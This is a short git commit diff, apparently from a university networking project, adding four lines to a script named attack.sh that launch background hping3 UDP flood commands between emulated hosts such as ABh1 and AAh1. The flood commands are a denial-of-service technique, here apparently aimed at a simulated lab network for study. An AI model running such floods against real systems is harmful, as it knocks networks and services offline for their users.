3d51c5a8a51eaeeae6aeb9a5cafe03cd2b7530ae
Simon Wimmer <wimmers@seas.upenn.edu>
2015-04-26 19:19:40 -0400

    Added script stuff

--- attack.sh
+++ attack.sh
@@ -8,4 +8,7 @@ BBh2 hping3 --flood --udp AAh1 &
 BBh2 hping3 --flood --udp AAh2 &
 BAh2 hping3 --flood --udp AAh1 &
 BAh2 hping3 --flood --udp AAh2 & 
-
+ABh1 hping3 --flood --udp AAh1 &
+ABh1 hping3 --flood --udp AAh2 &
+ABh2 hping3 --flood --udp AAh1 &
+ABh2 hping3 --flood --udp AAh2 &
